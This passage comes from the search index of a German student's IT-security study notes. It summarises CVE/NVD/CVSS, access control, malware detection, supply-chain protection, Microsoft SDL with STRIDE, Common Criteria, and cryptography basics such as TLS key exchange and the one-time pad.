erfolgreiche Pr\u00fcfungen werden dort angezeigt.</li> <li>Wichtig f\u00fcr:<ul> <li>Troubleshooting</li> <li>Sicherstellen, dass Policies wirklich greifen</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#1-was-ist-ein-cve","title":"\ud83c\udd94 1. Was ist ein CVE?","text":"<ul> <li> <p>CVE bedeutet Common Vulnerabilities and Exposures.</p> </li> <li> <p>Es ist eine public database von MITRE, in der jede bekannte Schwachstelle eine eindeutige ID erh\u00e4lt (z.\u202fB. CVE\u20112023\u201123923).</p> </li> <li>Mit dieser ID kann man weltweit konsistent \u00fcber dieselbe Schwachstelle sprechen - sei es in Security-Tools, Berichten oder beim Patch-Management.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#2-was-ist-die-nvd","title":"\ud83d\udcda 2. Was ist die NVD?","text":"<ul> <li>NVD steht f\u00fcr National Vulnerability Database (USA, betrieben von NIST).</li> <li>Sie erweitert CVE-Eintr\u00e4ge um wichtige Daten wie CVSS-Bewertungen, Produkteinordnung (CPE), Schwachstellentypen usw. </li> <li>Dadurch wird NVD zur Standardquelle f\u00fcr IT-Sicherheits-Analysen und Priorisierung.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#3-was-ist-cvss-common-vulnerability-scoring-system","title":"\ud83c\udfaf 3. Was ist CVSS (Common Vulnerability Scoring System)?","text":"<ul> <li> <p>Ein offenes Bewertungssystem (Metamodell) zur Einsch\u00e4tzung der Schwere von Schwachstellen </p> </li> <li> <p>Es erzeugt eine Punktzahl von 0-10 basierend auf drei Metrik-Gruppen:</p> <ol> <li>Base Metrics - konstante Eigenschaften (z.\u202fB. Angriffsvektor, Privilegienbedarf, Auswirkungen).</li> <li>Temporal Metrics - dynamisch (z.\u202fB. wenn ein Exploit verf\u00fcgbar ist).</li> <li>Environmental Metrics - organisationsspezifisch (z.\u202fB. wie weit verbreitet das System ist) </li> </ol> </li> <li> <p>Score-Bereiche:</p> <ul> <li>0.0 = Keine</li> <li>0.1-3.9 = Niedrig</li> <li>4.0-6.9 = Mittel</li> <li>7.0-8.9 = Hoch</li> <li>9.0-10.0 = Kritisch </li> </ul> </li> <li> <p>Ziel: Ein standardisiertes Bewertungssystem, um zu entscheiden, welche Schwachstellen am schnellsten behoben werden sollten .</p> </li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#4-wie-hangen-cve-nvd-und-cvss-zusammen","title":"\ud83c\udf10 4. Wie h\u00e4ngen CVE, NVD und CVSS zusammen?","text":"<ol> <li>Sicherheitsforscher melden eine Schwachstelle \u2192 CVE-ID wird vergeben.</li> <li>NIST f\u00fcgt diesen Eintrag in die NVD ein, erg\u00e4nzt um CVSS-Werte &amp; technische Details.</li> <li>Sicherheitsverantwortliche nutzen NVD-Eintr\u00e4ge, CVSS-Scores zur Priorisierung und Planung von Ma\u00dfnahmen.</li> </ol>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#warum-ist-das-wichtig","title":"\u2705 Warum ist das wichtig?","text":"<ul> <li>CVE = eindeutige, weltweit g\u00fcltige Identifikation.</li> <li>NVD = umfassende Informationsquelle + funktionale Details.</li> <li>CVSS = objektive Bewertung der Schwere - Grundlage f\u00fcr Risikoanalyse und Ma\u00dfnahmenpriorisierung.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#beispiel","title":"Beispiel","text":"<p>Ein CVE mit CVSS\u202f8,5 (z.\u202fB. CVE\u20112023\u20115540):</p> <ul> <li>Deckt hohe Gef\u00e4hrdung von Confidentiality, Integrity, Availability ab.</li> <li>L\u00f6st ab sofort Priorit\u00e4tsstufe 1 f\u00fcrs Patchen aus.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/","title":"IT Security Zusammenfassung","text":""},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#1-it-grundschutz-it-base-protection","title":"\ud83d\udca1 1. IT-Grundschutz (IT Base Protection)","text":"<p>Wichtig:</p> <ul> <li>Unterschiede zwischen Basis-, Kern- und Standard-Absicherung.<ul> <li>Basis: Einfacher Schutz</li> <li>Kern: Mittlere Schutz bzw. f\u00fcr gezielte Anwendungen mehr f\u00fcr andere weniger</li> <li>Standard: Umfassender Schutz mit Analyse und Dokumentation</li> </ul> </li> </ul> <p>IT-Grundschutz Baustein:     1. Welches Ger\u00e4t bzw. Ma\u00dfnahme?(Notebook, Handy, Server, PC)     2. Wovor soll es gesch\u00fctzt werden?(Ransome, Maleware, Physischer Zugang)     3. Welche Sicherheitsstufe braucht es?(niedrig, mittel, hoch)</p> <ul> <li>Inhalte von IT-Grundschutz-Bausteinen (z.\u202fB. Ma\u00dfnahmen, Gef\u00e4hrdungslage, Anforderungen).</li> <li>Was tun, wenn Management Ma\u00dfnahmen nicht umsetzen will?</li> <li>Wer setzt Ma\u00dfnahmen um bzw. \u00fcberpr\u00fcft sie?<ul> <li>Systemadministratoren </li> </ul> </li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#2-authentifizierung-passwortsicherheit","title":"\ud83d\udd10 2. Authentifizierung &amp; Passwortsicherheit","text":""},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#authentifizierungsmethoden","title":"Authentifizierungsmethoden","text":"<ul> <li>Wissen: Passwort, PIN.</li> <li>Besitz: Schl\u00fcssel, Karte.</li> <li>Sein: Fingerabdruck, Gesicht (Biometrie).</li> <li>Zwei-Faktor-Authentifizierung: Kombination aus zwei dieser Kategorien.</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#passwortsicherheit","title":"Passwortsicherheit","text":"<ul> <li>Hashing: Speicherung von Passw\u00f6rtern als Einwegfunktion.</li> <li>Salting: Einzigartiger Zusatzwert verhindert Rainbow-Table-Angriffe.</li> <li>Empfohlene Methoden: Bcrypt, Argon2. (Hat schon integriertes Salting)</li> <li>Empfohlene Mindestl\u00e4nge: z.\u202fB. 8 Zeichen an der HTWG.</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#3-schadsoftware-malware","title":"\ud83d\udca5 3. Schadsoftware (Malware)","text":"<ul> <li>Ransomware: Verschl\u00fcsselt Daten, verlangt L\u00f6segeld.</li> <li>Verbreitungswege: E-Mail, Schwachstellen, USB-Sticks.</li> <li> <p>Erkennung durch Antivirenprogramme:</p> <ol> <li>Signaturbasiert: Bekannte Muster \u2192 schnell, aber blind f\u00fcr neue Viren.<ol> <li>Erkennt keine Zero-Day angriffe</li> <li>Erkennt Signaturen wie zB Zeichenfolge <code>x90x90xE8x00x00</code></li> </ol> </li> <li>Heuristik: Verhaltensanalyse \u2192 erkennt neue Varianten.<ol> <li>Erkennen auff\u00e4lliges verhalten wie zB<ul> <li>Selbstreplikation</li> <li>Verschl\u00fcsselung von Dateien</li> <li>Zugriff auf Systemverzeichnisse</li> <li>Manipulation von Registry Eintr\u00e4gen</li> </ul> </li> </ol> </li> <li>Sandboxing: Testausf\u00fchrung in sicherer Umgebung.<ol> <li>Verd\u00e4chtige Programme werden erstmal in einem virtuellen Contianer ausgef\u00fchrt</li> </ol> </li> </ol> </li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#4-zugriffssteuerung-access-control","title":"\ud83d\udd13 4. Zugriffssteuerung (Access Control)","text":"<ul> <li> <p>Grundbegriffe:</p> <ul> <li>SID: Security Identifier (Benutzer oder Gruppenkennung).<ul> <li>In Tokens, Zugriffslisten(ACL), Events/Logs</li> </ul> </li> <li>Privilege: Systemweite Rechte.</li> <li>ACL (Access Control List): Liste mit Zugriffsrechten.<ul> <li>Jede Datei hat seine eigene ACL: zB f\u00fcr IT-Security.pdf       SID_B: Darf lesen       SID_A: Darf schreiben und lesen</li> </ul> </li> <li>ACE (Access Control Entry): Eintrag in ACL.<ul> <li>SID</li> <li>Rechte(Lesen,Schreiben,L\u00f6schen)</li> <li>Typ</li> </ul> </li> </ul> </li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#arten-von-privilege","title":"Arten von Privilege","text":"Privilege Bedeutung (vereinfacht) Wer sollte das haben? <code>SeShutdownPrivilege</code> System herunterfahren Benutzer, Admins <code>SeBackupPrivilege</code> Alles sichern - auch ohne normale Leserechte Backup-Programme, Admins <code>SeRestorePrivilege</code> Dateien \u00fcberall zur\u00fcckspielen Admins, Wiederherstellung <code>SeDebugPrivilege</code> In fremde Programme reinschauen oder ver\u00e4ndern Entwickler, Debug-Tools <code>SeTakeOwnershipPrivilege</code> Eigent\u00fcmer von Objekten \u00e4ndern Admins <code>SeChangeNotifyPrivilege</code> Benachrichtigt werden, wenn sich was in Ordnern \u00e4ndert Fast jeder Benutzer <code>SeCreateSymbolicLinkPrivilege</code> Symlinks (Verkn\u00fcpfungen) anlegen Admins <code>SeLoadDriverPrivilege</code> Kernel-Treiber laden Nur sehr vertrauensw\u00fcrdig <ul> <li> <p>Arten der Steuerung:</p> <ul> <li>DAC (Discretionary Access Control): Benutzer entscheidet.<ul> <li>Owner der Datei kann Rechte vergeben</li> <li>Du erstellst eine Datei und erlaubst \u201eBenutzer B\u201c Lesezugriff \u2192 das ist DAC.</li> </ul> </li> <li>RBAC (Role-Based Access Control): Rechte \u00fcber Rollen.<ul> <li>Rollen die diverse Rechte haben</li> </ul> </li> <li>ABAC (Attribute-Based Access Control): Zugriff nach Attributen.<ul> <li>zB: Benutzer Max mit SID \"..\" Darf heute um 16Uhr-20Uhr die Datei \u00f6ffnen</li> <li>Zus\u00e4tzlich falls man erg\u00e4nzende Attribute haben m\u00f6chte mit RBAC oder DAC</li> </ul> </li> </ul> </li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#5-positivlisten-whitelisting-wdac","title":"\u2705 5. Positivlisten / Whitelisting (WDAC)","text":"<ul> <li> <p>WDAC = Windows Defender Application Control</p> <ul> <li>Nur zugelassene Programme d\u00fcrfen starten.</li> </ul> </li> <li> <p>Arten von Whitelists:</p> <ul> <li>Pfad-basiert: z.\u202fB. <code>C:\\Program Files</code></li> <li>Zertifikat-basiert: Nur signierte Programme.</li> <li>Hash-basiert: Pr\u00fcfsumme von Dateien.</li> </ul> </li> </ul> <p>Szenario wenn trotzdem versucht wird nicht gelistete Programme auszuf\u00fchren - Enforced: Programm wird blockiert - Audit Mode: Testlauf ohne Durchsetzung, dient zur Analyse.</p> <ul> <li>Herausforderungen: Flexibilit\u00e4t bei PC-Pools, Updates.</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#6-lieferkettensicherheit-supply-chain-attacks","title":"\ud83d\udd17 6. Lieferkettensicherheit / Supply Chain Attacks","text":"<ul> <li> <p>Was ist das?</p> <ul> <li>Angreifer manipulieren Software oder Komponenten w\u00e4hrend der Entwicklung oder Verteilung.</li> <li>System wird schon beim Zulieferer kompromittiert.</li> <li></li> </ul> </li> <li> <p>Beispiele: SolarWinds, log4j.</p> </li> <li>Risiken durch Drittanbieter: z.\u202fB. Huawei (politisch), Open Source (Transparenz vs. Kontrolle).</li> <li>Ma\u00dfnahmen: Signaturen, Vertrauen in Quellen, 2FA f\u00fcr Maintainer.</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#schutzmanahmen-gegen-supply-chain-attacks","title":"\ud83d\udee1\ufe0f Schutzma\u00dfnahmen gegen Supply Chain Attacks","text":"Ma\u00dfnahme Erkl\u00e4rung \u2705 Digitale Signaturen Sicherstellen, dass Software nicht ver\u00e4ndert wurde (Authentizit\u00e4t + Integrit\u00e4t) \u2705 Hash-Pr\u00fcfsummen Vergleich von Dateien mit offiziellen Hashes (SHA256 etc.) \u2705 2FA f\u00fcr Entwickler Schutz von Entwicklerkonten und Repositories \u2705 Code Signing Policies Nur signierte Software darf ausgef\u00fchrt werden (z.\u202fB. mit WDAC oder AppLocker) \u2705 SBOM (Software Bill of Materials) Dokumentation aller Abh\u00e4ngigkeiten in der Software - wer nutzt was? \u2705 Monitoring &amp; Logging Fr\u00fchzeitiges Erkennen verd\u00e4chtigen Verhaltens \u2705 Zero Trust \u201eVertraue niemandem automatisch\u201c - auch nicht internen Komponenten"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#7-schwachstellen-verwundbarkeiten","title":"\ud83e\uddec 7. Schwachstellen &amp; Verwundbarkeiten","text":"<ul> <li>Datenbanken wie NVD (National Vulnerability Database) helfen beim Patchmanagement.</li> <li>CVE: Eindeutige Kennungen f\u00fcr Schwachstellen.</li> <li>CWE: Kategorisierung von Schwachstellentypen (z.\u202fB. CWE-120 = Buffer Overflow).</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#8-statische-codeanalyse","title":"\ud83e\uddea 8. Statische Codeanalyse","text":"<ul> <li>Analyse des Codes ohne Ausf\u00fchrung.</li> <li> <p>Ziel: Schwachstellen fr\u00fchzeitig erkennen.</p> </li> <li> <p>Begriffe:</p> <ul> <li>True Positive: Fehler korrekt erkannt.</li> <li>False Positive: Fehlalarm.</li> <li>False Negative: Fehler \u00fcbersehen.</li> </ul> </li> <li> <p>Problematisch: Viele False Positives f\u00fchren zu Frustration und Ignoranz.</p> </li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#sicherheit","title":"\ud83d\udd10 Sicherheit:","text":"<ul> <li>Buffer Overflows</li> <li>SQL Injections</li> <li>**XSS</li> <li>Ungepr\u00fcfte Benutzereingaben</li> <li>Uninitialisierte Variablen</li> <li>Ressourcenlecks</li> <li>Unsichere API-Nutzung</li> <li>Race Conditions (nur teilweise)</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#codequalitat","title":"\ud83e\uddf9 Codequalit\u00e4t:","text":"<ul> <li>Unbenutzter Code</li> <li>Magische Zahlen</li> <li>Spaghetticode</li> <li>Verst\u00f6\u00dfe gegen Coding-Standards</li> <li>Verwirrende oder doppelte Logik</li> <li>Schlechte Namensgebung</li> <li>Missachtung von \u201eClean Code\u201c-Prinzipie</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#tools-fur-statische-codeanalyse","title":"\ud83d\udce6 Tools f\u00fcr statische Codeanalyse","text":""},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#open-source-frei","title":"\ud83d\udd39 Open Source &amp; frei","text":"Tool Sprache Spezialisiert auf\u2026 SonarQube Java, C#, JS, uvm. Qualit\u00e4t + Sicherheit ESLint JavaScript, TypeScript Stil, Fehler Bandit Python Sicherheitsl\u00fccken Cppcheck C/C++ Speicher, Performance Brakeman Ruby on Rails Web-Schwachstellen Semgrep Multi-Language Muster- &amp; Policy-Erkennung"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#9-risikobewertung-risk-assessment","title":"\ud83d\udcc8 9. Risikobewertung (Risk Assessment)","text":"<ul> <li>Zwei Hauptfaktoren:<ul> <li>Wahrscheinlichkeit (dass ein Schaden eintritt)</li> <li>Auswirkung (wenn er eintritt)</li> </ul> </li> <li>Schwierigkeit: Exakte Bewertung h\u00e4ngt stark von Daten und Erfahrung ab.</li> </ul> <p>Risiko = Wahrscheinlichkeit \u00d7 Auswirkung</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#beispiel-risiko-matrix","title":"Beispiel: Risiko-Matrix","text":"<p>|Niedrige Auswirkung|Mittlere Auswirkung|Hohe Auswirkung| |---|---|---|---| |Niedrige Wahrscheinlichkeit|\ud83d\udfe2 niedrig|\ud83d\udfe1 niedrig-mittel|\ud83d\udfe1 mittel| |Mittlere Wahrscheinlichkeit|\ud83d\udfe1 niedrig-mittel|\ud83d\udfe0 mittel|\ud83d\udd34 hoch| |Hohe Wahrscheinlichkeit|\ud83d\udfe1 mittel|\ud83d\udd34 hoch|\ud83d\udd34 kritisch|</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#10-microsoft-sdl-security-development-lifecycle","title":"\ud83e\uddf1 10. Microsoft SDL (Security Development Lifecycle)","text":"<p>Microsoft SDL(Security Development Lifecycle) ist wichtig damit man schon w\u00e4hrend der Entwicklung feststellt an welchen Stellen im Code wir vorsichtig sein m\u00fcssen. Es werden schon Risiken betrachtet bevor die App \u00fcberhaupt gebaut wird.</p> <ul> <li>Beispiele f\u00fcr SDL-Praktiken:<ul> <li>Threat Modeling</li> <li>Use of Safe Libraries</li> <li>Security Requirements</li> <li>Incident Response Plan</li> </ul> </li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#1-threat-modeling","title":"\ud83d\udd0e 1. Threat Modeling","text":"<p>Fr\u00fchzeitige Analyse: Welche Bedrohungen k\u00f6nnten unsere Software treffen?</p> <ul> <li>Identifiziere: Assets, Angriffsfl\u00e4chen, Angreiferziele</li> <li>Tools: STRIDE-Modell (Spoofing, Tampering, Repudiation, Info Disclosure, Denial of Service, Elevation of Privilege)</li> <li>Ergebnis: Bedrohungsszenarien + passende Gegenma\u00dfnahmen</li> </ul> <p>\u2705 Beispiel:</p> <p>\u201eWenn jemand direkt API-Calls schicken kann, ohne Authentifizierung, ist das ein Risiko \u2192 Authentifizierungspr\u00fcfung einbauen.\u201c</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#stride-modell-einfacher-erklart","title":"\ud83e\uddf0 STRIDE-Modell - einfacher erkl\u00e4rt","text":"<p>Das ist ein Werkzeug zum systematischen Nachdenken \u00fcber Bedrohungen. Jeder Buchstabe steht f\u00fcr eine Art von Angriff:</p> K\u00fcrzel Name Hei\u00dft auf Deutsch Beispiel (sehr einfach) S Spoofing Vort\u00e4uschen falscher Identit\u00e4t Jemand gibt sich als Admin aus T Tampering Daten manipulieren Ein Angreifer ver\u00e4ndert eine Datei oder Datenbank R Repudiation Abstreiten von Handlungen Jemand l\u00f6scht Daten und sagt: \u201eWar ich nicht!\u201c I Information Disclosure Informationen ausspionieren Hacker liest Passw\u00f6rter oder E-Mails aus D Denial of Service Dienst lahmlegen Server wird mit Anfragen geflutet (DDoS) E Elevation of Privilege Berechtigungen ausweiten Normaler Nutzer wird pl\u00f6tzlich Admin"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#2-use-of-safe-libraries","title":"\ud83e\uddf1 2. Use of Safe Libraries","text":"<p>Statt alles selbst zu implementieren: bew\u00e4hrte, gepr\u00fcfte Bibliotheken verwenden</p> <ul> <li>Keine selbstgebauten Crypto-Funktionen!</li> <li>Beispiel:<ul> <li>Verwende <code>bcrypt</code> statt eigenen Passwort-Hash</li> <li>Nutze Framework-eigene Schutzmechanismen (ORMs, CSRF-Tokens)</li> </ul> </li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#3-security-requirements","title":"\ud83d\udcdc 3. Security Requirements","text":"<p>Schon in der Planung werden Sicherheitsanforderungen definiert - Beispiel: \u201eLogin muss gegen Brute-Force gesch\u00fctzt sein\u201c - Zugriffskontrollen, Verschl\u00fcsselung, Logging etc. - Sicherheit wird Teil der Spezifikation</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#4-incident-response-plan","title":"\ud83d\udcdb 4. Incident Response Plan","text":"<p>Was tun, wenn doch was schiefgeht? - Wer ist verantwortlich? - Wie reagieren wir schnell? - Was muss kommuniziert werden? - Welche Logs ben\u00f6tigen wir?</p> <p>\u27a1\ufe0f Muss vor dem Ernstfall klar definiert sein!</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#weitere-sdl-elemente-je-nach-phase","title":"\ud83c\udfaf Weitere SDL-Elemente (je nach Phase):","text":"Phase Ma\u00dfnahme Design Threat Modeling Implementierung Secure Coding Standards, Safe APIs Test Statische Codeanalyse, Fuzzing Release Sicherheits-Review, Signatur Betrieb Patching, Monitoring, Incident Handling"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#vorteile-des-sdl","title":"\u2705 Vorteile des SDL:","text":"Vorteil Warum wichtig? Fr\u00fche Erkennung Fehler sind am billigsten, wenn sie fr\u00fch entdeckt werden Bessere Qualit\u00e4t Weniger Bugs, stabilere Software Wiederholbarer Prozess Sicherheit wird systematisch, nicht zuf\u00e4llig Kompatibel mit DevOps L\u00e4sst sich in CI/CD integrieren"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#11-zertifizierung-common-criteria-cc","title":"\ud83c\udfc5 11. Zertifizierung / Common Criteria (CC)","text":"<p>Die Common Criteria (ISO/IEC 15408) sind ein international standardisiertes Bewertungsschema zur Beurteilung der Sicherheitseigenschaften von IT-Produkten.</p> <ul> <li>Bewertungsschema f\u00fcr IT-Produkte (z.\u202fB. EAL1-EAL7).<ul> <li>EAL4: \"Methodisch getestet und \u00fcberpr\u00fcft\".</li> </ul> </li> <li>AVA_VAN Analyse: Schwachstellenanalyse.</li> <li>CEM-Dimensionen f\u00fcr Angreifer: Wissen, Zeit, Zugang, Know-how, Motivation</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#ziel-vertrauen-schaffen","title":"\ud83d\udee0\ufe0f Ziel: Vertrauen schaffen","text":"<p>Ein Hersteller kann sagen:</p> <p>\u201eMein Produkt erf\u00fcllt diese Sicherheitsanforderungen und wurde unabh\u00e4ngig gepr\u00fcft.\u201c</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#eal-evaluation-assurance-level","title":"\ud83d\udccf EAL - Evaluation Assurance Level","text":"EAL-Stufe Bedeutung EAL1 Funktional getestet EAL2 Strukturell getestet EAL3 Methodisch getestet EAL4 \u2705 Methodisch getestet und \u00fcberpr\u00fcft EAL5 Semi-formal getestet und \u00fcberpr\u00fcft EAL6 Semi-formal verifiziert EAL7 Formal verifiziert (h\u00f6chste Stufe, teuer) <p>\ud83d\udccc EAL4 ist in der Praxis h\u00e4ufig der h\u00f6chste realistisch sinnvolle Level \u2192 z.\u202fB. f\u00fcr Firewalls, Security Tokens, kritische Software</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#ava_van-schwachstellenanalyse","title":"\ud83d\udd0e AVA_VAN - Schwachstellenanalyse","text":"<p>Im Rahmen von CC werden Angriffe simuliert (Vulnerability Analysis):</p> Stufe Beschreibung AVA_VAN.1 Gelegenheitsschwachstellen, geringes Know-how AVA_VAN.5 Fortgeschrittene, organisierte Angriffe"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#cem-dimensionen-wie-bewertet-man-einen-angreifer","title":"\ud83e\udde0 CEM-Dimensionen: Wie bewertet man einen Angreifer?","text":"<p>Das Common Evaluation Methodology (CEM) bewertet einen Angreifer anhand von:</p> Dimension Bedeutung Wissen Kenntnis der Technik und der Angriffsziele Zugang Hat er physischen Zugriff? Netzwerkzugang? Zeit Wie viel Zeit steht ihm zur Verf\u00fcgung? Know-how Technische F\u00e4higkeit Motivation Wie motiviert (staatlich? Hobby?) <p>Je h\u00f6her die Stufe, desto fortgeschrittener muss ein Produkt abgesichert sein, um als sicher zu gelten.</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#zusammenfassung-common-criteria","title":"\u2705 Zusammenfassung: Common Criteria","text":"Begriff Erkl\u00e4rung CC Standard zur Sicherheitsbewertung von IT-Produkten EAL1-7 Bewertungsstufen - je h\u00f6her, desto aufwendiger AVA_VAN Teststufen f\u00fcr Schwachstellenanalyse CEM-Dimensionen Wie stark/m\u00e4chtig ist der Angreifer"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#verbindung-zum-rest-der-sicherheitskonzepte","title":"\ud83e\udde0 Verbindung zum Rest der Sicherheitskonzepte","text":"Konzept Verbindung zu SDL/CC Secure Coding Teil von SDL Statische Analyse Wird in SDL &amp; CC genutzt Risikobewertung Flie\u00dft in AVA_VAN und SDL-Planung ein Access Control / ACLs Werden in Sicherheitsanforderungen &amp; Evaluation ber\u00fccksichtigt Kryptographie Muss in CC-Produkten dokumentiert &amp; begr\u00fcndet sein"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#12-kryptographie","title":"\ud83d\udd10 12. Kryptographie","text":"<ul> <li>Symmetrisch: Ein Schl\u00fcssel f\u00fcr Ver- und Entschl\u00fcsselung (z.\u202fB. AES = Advanced Encryption Standard)</li> <li>Asymmetrisch: Zwei Schl\u00fcssel (\u00f6ffentlich/privat, z.\u202fB. RSA).</li> <li>Hybrid: Kombination (z.\u202fB. bei HTTPS).</li> <li>One-Time-Pad: Theoretisch perfekt sicher, aber unpraktisch.</li> <li>Verwendung von Zufallszahlen: z.\u202fB. Schl\u00fcsselerzeugung, Nonce</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#symmetrische-kryptographie","title":"\ud83d\udd11 Symmetrische Kryptographie","text":""},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#prinzip","title":"\u25b6\ufe0f Prinzip:","text":"<p>Ein Schl\u00fcssel zum Ver- und Entschl\u00fcssel \ud83d\udd10 Beide Seiten m\u00fcssen denselben geheimen Schl\u00fcssel kennen.</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#eigenschaften","title":"\ud83e\udde0 Eigenschaften:","text":"<ul> <li>Sehr schnell</li> <li>Geeignet f\u00fcr gro\u00dfe Datenmengen</li> <li>Schl\u00fcsselverteilung ist die Schwachstelle</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#asymmetrische-kryptographie","title":"\ud83d\udddd\ufe0f Asymmetrische Kryptographie","text":""},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#prinzip_1","title":"\u25b6\ufe0f Prinzip:","text":"<p>Zwei Schl\u00fcssel: - \u00d6ffentlicher Schl\u00fcssel (zum Verschl\u00fcsseln oder Pr\u00fcfen) - Privater Schl\u00fcssel (zum Entschl\u00fcsseln oder Signieren)</p> <p>Nur der Besitzer des privaten Schl\u00fcssels kann die Nachricht entschl\u00fcsseln oder eine Signatur erzeugen.</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#eigenschaften_1","title":"\ud83e\udde0 Eigenschaften:","text":"<ul> <li>Keine gemeinsame Schl\u00fcsselverteilung n\u00f6tig</li> <li>Langsamer als symmetrisch</li> <li>Erm\u00f6glicht Digitale Signaturen</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#hybride-kryptosysteme","title":"\ud83d\udd00 Hybride Kryptosysteme","text":"<p>Kombinieren symmetrisch + asymmetrisch, um das Beste aus beiden Welten zu nutzen.</p> <p>\ud83d\udee0\ufe0f Typisch in der Praxis: - Asymmetrisch f\u00fcr sicheren Schl\u00fcsselaustausch - Danach: Symmetrisch f\u00fcr schnellen Datentransfer</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#beispiel-https-tls","title":"\ud83d\udce6 Beispiel: HTTPS (TLS)","text":"<ol> <li>Browser(Client) \u2192 Server: Fragt Zertifikat an</li> <li>Browser(Client) generiert geheimen Session-Key</li> <li>Client schickt ihn asymmetrisch verschl\u00fcsselt an Server(z.\u202fB. mit RSA(Rivest Shamir Adleman))</li> <li>Server kann Verbindung nun \u00fcber symmetrische Verschl\u00fcsselung laufen lassen (z.\u202fB. AES)</li> </ol>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#details-zum-schlusselaustausch","title":"\ud83d\udd0e Details zum Schl\u00fcsselaustausch","text":""},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#rsa-modus-alter-aber-einfach","title":"\ud83d\udd10 RSA-Modus (\u00e4lter, aber einfach):","text":"<ul> <li>Client erzeugt Session-Key \u2192 verschl\u00fcsselt ihn mit RSA</li> <li>Server entschl\u00fcsselt ihn mit seinem privaten Schl\u00fcssel</li> </ul>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#ecdhe-modus-moderner","title":"\ud83e\uddee ECDHE-Modus (moderner):","text":"<ul> <li>Beide Seiten generieren tempor\u00e4re elliptische Schl\u00fcsselpaare</li> <li>Nutzen Diffie-Hellman \u00fcber elliptische Kurven (ECDHE)</li> <li>Vorteile:<ul> <li>Perfect Forward Secrecy (PFS) \u2192 selbst wenn der private Schl\u00fcssel geleakt wird, sind alte Sessions weiterhin sicher</li> </ul> </li> </ul> <p>\u27a1\ufe0f Moderne Browser + Server nutzen immer ECDHE f\u00fcr mehr Sicherheit</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#one-time-pad-otp","title":"\ud83e\udde8 One-Time-Pad (OTP)","text":"<p>Das One-Time Pad ist die einzige Verschl\u00fcsselungsmethode, die mathematisch 100\u202f% sicher ist - aber praktisch kaum nutzbar.</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#wie-funktionierts","title":"\ud83e\udde0 Wie funktioniert\u2019s?","text":"<ol> <li> <p>Du hast einen Schl\u00fcssel (Pad), der:</p> <ul> <li>genauso lang ist wie die Nachricht</li> <li>wirklich zuf\u00e4llig ist (nicht pseudorandom!)</li> <li>nur einmal verwendet wird</li> </ul> </li> <li> <p>Du verschl\u00fcsselst mit XOR</p> <p><code>Ciphertext = Nachricht XOR Schl\u00fcssel</code></p> </li> </ol> <p>Zum Entschl\u00fcsseln machst du wieder:</p> <p><code>Nachricht = Ciphertext XOR Schl\u00fcssel</code></p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#vorteile","title":"\u2705 Vorteile:","text":"Vorteil Warum? Perfekte Sicherheit Wenn die Bedingungen erf\u00fcllt sind, ist das Verfahren nicht zu knacken, selbst mit unendlich Rechenleistung Einfaches Verfahren Nur XOR, keine komplizierten 